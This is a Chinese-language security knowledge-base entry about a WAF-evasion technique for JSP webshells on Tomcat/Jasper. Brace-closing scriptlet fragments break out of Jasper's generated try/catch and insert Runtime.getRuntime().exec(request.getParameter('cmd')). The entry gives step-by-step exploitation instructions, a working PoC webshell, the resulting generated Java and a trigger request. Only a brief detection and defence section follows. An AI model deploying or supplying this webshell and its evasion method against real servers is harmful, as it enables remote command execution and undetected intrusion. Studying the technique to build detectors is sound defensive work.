---
id: web-java-rce-jsp-scriptlet-special-closure-bypass
title: JSP scriptlet 特殊闭合逃逸生成 Java 的 try/catch 结构绕过检测
type: scenario
domain: web
path: web/java/rce
technique: jsp-scriptlet-brace-closure-bypass
tags:
- java
- jsp
- webshell
- waf-bypass
- tomcat
- jasper
- scriptlet
- brace
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:45:33+08:00'
  notes: 已对照原文与图07/12/13核对：generatePreamble 写入 try {，scriptlet 原样插入；}catch(Throwable t){ 与 }try { 闭合后生成的 Java 结构合法（图12），访问 ?cmd=calc 弹计算器（图13）。原文未声明版本区间，仅依赖 Jasper 的 try/catch 包装结构。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/java/rce/web-java-rce-jsp-scriptlet-special-closure-bypass/
draft: false
kb_aliases:
- JSP 特殊闭合免杀
- scriptlet 闭合 webshell
- JSP 大括号逃逸
- catch/try 闭合绕过
- Jasper 生成代码闭合
---

## 一句话结论

Jasper 生成的 servlet 会把 JSP 正文包在 `try { ... } catch (Throwable t) { ... }` 中，而 scriptlet 文本被原样插入；攻击者在 scriptlet 中写入 `} catch (Throwable t) {` 和 `} try {` 等片段，闭合框架生成的 try/catch 并另开一个 try，把 `Runtime.exec` 放进合法的代码位置，原始 JSP 结构看起来支离破碎，静态检测器难以识别。

## 原理

- Jasper 的 `Generator.generatePreamble()` 在生成的 Java 中写入 `try {`，正文结束后 `generatePostamble()` 写入对应的 `catch (Throwable t) { ... }`。也就是说，JSP 正文永远位于一个隐式 try 块内。
- `<% ... %>` scriptlet 的内容由 `Generator.visit(Node.Scriptlet)` 原样 `out.printMultiLn(n.getText())` 写入 Java 文件，Jasper 不会检查大括号是否配平到“脚本片段级别”，只要求最终拼接出的 Java 源码合法。
- 攻击者在 scriptlet 中写 `} catch (java.lang.Throwable t) {`，可以用自己的 `}` 关闭框架的 try、用自己的 `catch` 接上框架原本的 catch 位置；再写 `} try {` 关闭这个 catch 并重新打开一个 try，把恶意代码放进去。最终生成的 Java 结构仍是合法的：
  ```java
  try {
      ... generated preamble ...
  } catch (Throwable t) {
  } try {
      Runtime.getRuntime().exec(request.getParameter("cmd"));
  }
  catch (Throwable t) {
      ... framework catch ...
  }
  ```
- 原始 JSP 只由几个不完整的 `}`、`catch`、`try` 片段组成，没有完整的危险调用上下文；按行/正则匹配的 WAF 很难判断这些片段组合后的语义，而容器编译时会把它们拼成完整、可执行的 Java。
- 该技巧成立的核心是“JSP 片段级语法不合法，但拼接后的 Java 合法”；任何做 JSP 语法解析/编译或大括号平衡分析的检测器都能识别。

## 触发条件

- 目标使用 Tomcat/Jasper（生成的 servlet 以 try/catch 包裹正文；其他容器的包装结构可能不同）。
- 攻击者能上传/写入 `.jsp` 并让其编译执行。
- 检测器只看原始 JSP 文本，不做 JSP 解析、括号配平或编译后分析。
- 攻击者了解目标 Jasper 版本生成的 preamble/postamble 结构，能构造出配平的片段。

## 利用步骤

1. 确认目标为 Jasper，且 JSP 正常编译（可先上传一个简单 JSP）。
2. 按目标生成的 servlet 结构构造闭合片段：先用 `}catch (java.lang.Throwable t){` 关闭隐式 try，再用 `}try {` 关闭 catch 并开启新 try。
3. 在新 try 中放入 `Runtime.getRuntime().exec(request.getParameter("cmd"));`。
4. 让框架的 postamble（`catch (Throwable t)`）接在新 try 之后，形成合法 Java。
5. 上传后访问并传命令参数；若编译失败，查看 Tomcat work 目录下生成的 `.java`，按报错调整大括号数量。
6. 可配合 `trimDirectiveWhitespaces='true'` 去掉片段间多余输出，减少生成代码噪音。

## PoC

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page trimDirectiveWhitespaces='true' %>
<%
    }catch (java.lang.Throwable t){
%>
<%
    }try {
    Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```

```java
// 生成的关键 Java 结构（节选）
try {
    response.setContentType("text/html;charset=UTF-8");
    pageContext = _jspxFactory.getPageContext(...);
    ...
}catch (java.lang.Throwable t){

}try {
    Runtime.getRuntime().exec(request.getParameter("cmd"));
}

catch (java.lang.Throwable t) {
    if (!(t instanceof javax.servlet.jsp.SkipPageException)){
        ...
    }
}
```

```text
# 访问：
GET /test/test.jsp?cmd=calc
# 命令执行成功（原文以弹出计算器验证）。
```

## 变体与关联

- 变体：闭合片段可按目标 Jasper 的 preamble/postamble 调整，例如使用 `}finally{`、嵌套 try、或补齐 `catch` 参数；不同 Tomcat 版本生成的包装可能不同。
- 变体：与 `trimDirectiveWhitespaces`、`pageEncoding` 组合，分别处理空白、编码与结构三层检测。
- 变体：同类思路也可用于闭合生成代码中的方法/类边界（如提前结束 `_jspService`），但更容易导致编译失败，需按版本调试。
- 关联：[[web-java-rce-jsp-trim-whitespace-fragment-bypass]]（片段拼接）；[[web-java-rce-jsp-pageencoding-static-detection-bypass]]（编码绕过）。
- 边界：非 Jasper 容器、Jasper 版本改变 preamble/postamble 结构、检测器做 JSP 解析/编译、或上传点禁止 JSP 时失效；片段错误会导致 500/编译错误，需要反复对照生成的 Java 调整。

## 检测与防御

- 检测：对 JSP 做语法解析、括号配平与编译；检测 scriptlet 中出现不成对的 `}`、`catch`、`try` 片段；监控 work 目录生成的 Java 中是否出现异常的执行语句。
- 修复：禁止上传/写入 JSP；上传目录不可执行；使用白名单文件类型与内容校验。
- 加固：WAF 对 JSP 做标签归一化、编译后分析；对 Web 目录做完整性基线；限制写权限。
